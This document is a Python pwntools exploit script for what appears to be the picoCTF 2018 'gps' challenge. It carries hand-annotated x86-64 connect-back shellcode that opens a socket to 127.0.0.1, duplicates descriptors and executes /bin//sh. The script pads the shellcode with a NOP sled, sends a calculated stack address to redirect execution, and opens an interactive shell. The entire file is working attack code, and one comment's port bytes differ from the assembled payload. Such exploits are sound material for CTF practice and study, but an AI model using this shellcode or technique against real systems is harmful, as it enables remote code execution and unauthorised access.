#! /usr/bin/env python
from binascii import unhexlify
import sys
#
from pwn import context, p32, u32, log, process, remote, args
from pwn import gdb
context.clear(arch='amd64', os='linux')


class ExploitInfo:
    host        = '2018shell2.picoctf.com'
    port        = 29035
    name        = 'gps'
    #
    shellcode_x86_64 = unhexlify(
        # % rasm2 -b 64 -D 31f6f7e6ffc66a025f04290f05505f5252c74424047dfffefe814424040201010266c7442402115cc6042402545e6a105a6a2a580f056a035effceb0210f0575f8565a5648bf2f2f62696e2f736857545fb03b0f05
                     '31f6' # 0x00000000   2  xor esi, esi
                     'f7e6' # 0x00000002   2  mul esi
                     'ffc6' # 0x00000004   2  inc esi
                     '6a02' # 0x00000006   2  push 2
                       '5f' # 0x00000008   1  pop rdi
                     '0429' # 0x00000009   2  add al, 0x29
                     '0f05' # 0x0000000b   2  syscall
                       '50' # 0x0000000d   1  push rax
                       '5f' # 0x0000000e   1  pop rdi
                       '52' # 0x0000000f   1  push rdx
                       '52' # 0x00000010   1  push rdx
         'c74424047dfffefe' # 0x00000011   8  mov dword [rsp + 4], 0xfefeff7d
         '8144240402010102' # 0x00000019   8  add dword [rsp + 4], 0x2010102
           '66c74424020b4d' # 0x00000021   7  mov word [rsp + 2], 0x4d0b
                 'c6042402' # 0x00000028   4  mov byte [rsp], 2
                       '54' # 0x0000002c   1  push rsp
                       '5e' # 0x0000002d   1  pop rsi
                     '6a10' # 0x0000002e   2  push 0x10
                       '5a' # 0x00000030   1  pop rdx
                     '6a2a' # 0x00000031   2  push 0x2a
                       '58' # 0x00000033   1  pop rax
                     '0f05' # 0x00000034   2  syscall
                     '6a03' # 0x00000036   2  push 3
                       '5e' # 0x00000038   1  pop rsi
                     'ffce' # 0x00000039   2  dec esi
                     'b021' # 0x0000003b   2  mov al, 0x21
                     '0f05' # 0x0000003d   2  syscall
                     '75f8' # 0x0000003f   2  jne 0x39
                       '56' # 0x00000041   1  push rsi
                       '5a' # 0x00000042   1  pop rdx
                       '56' # 0x00000043   1  push rsi
     '48bf2f2f62696e2f7368' # 0x00000044  10  movabs rdi, 0x68732f6e69622f2f
                       '57' # 0x0000004e   1  push rdi
                       '54' # 0x0000004f   1  push rsp
                       '5f' # 0x00000050   1  pop rdi
                     'b03b' # 0x00000051   2  mov al, 0x3b
                     '0f05' # 0x00000053   2  syscall
    )
    #
    gdb = r"""\
break *0x004009b8
break *0x00400aaa
continue

echo #################### The offset and stk address ####################\n
printf "&stk: %p, offset: %d\n",$rbp-0x15,$eax
echo
continue

echo #################### Buffer address ####################\n
printf "&buffer: %p\n",$rbp-0x1010
echo
"""


def get_process():
    r = None
    if args.REMOTE:
        r = remote(ExploitInfo.host, ExploitInfo.port)
    else:
        r = process('./%s' % ExploitInfo.name)
        if args.GDB:
            gdb.attach(r.pid, ExploitInfo.gdb)

    return r


def get_stk_position(r):
    r.recvuntil('position: ')
    position = r.recvline(keepends=False)
    position = int(position, 16)
    return position


def main():
    BUFFER_len      = 0x1000 - 1
    GPS_ACCURACY    = 1337

    p = get_process()

    position = get_stk_position(p)
    buffer_position = position + GPS_ACCURACY - 1

    NOP_sled = '\x90' * (BUFFER_len - len(ExploitInfo.shellcode_x86_64))
    payload = NOP_sled
    payload += ExploitInfo.shellcode_x86_64
    assert('\x00' not in payload)

    p.clean()
    # log.info("Sending: %r", payload)
    p.sendline(payload)

    p.clean(timeout=0.5)
    log.info("Sending position: 0x%x", buffer_position)
    p.sendline(hex(buffer_position))

    # p.clean(timeout=0.5)
    log.success("Here are your shell!")
    # p.sendline('ls -la')
    p.interactive()
    p.close()


if __name__ == "__main__":
    main()
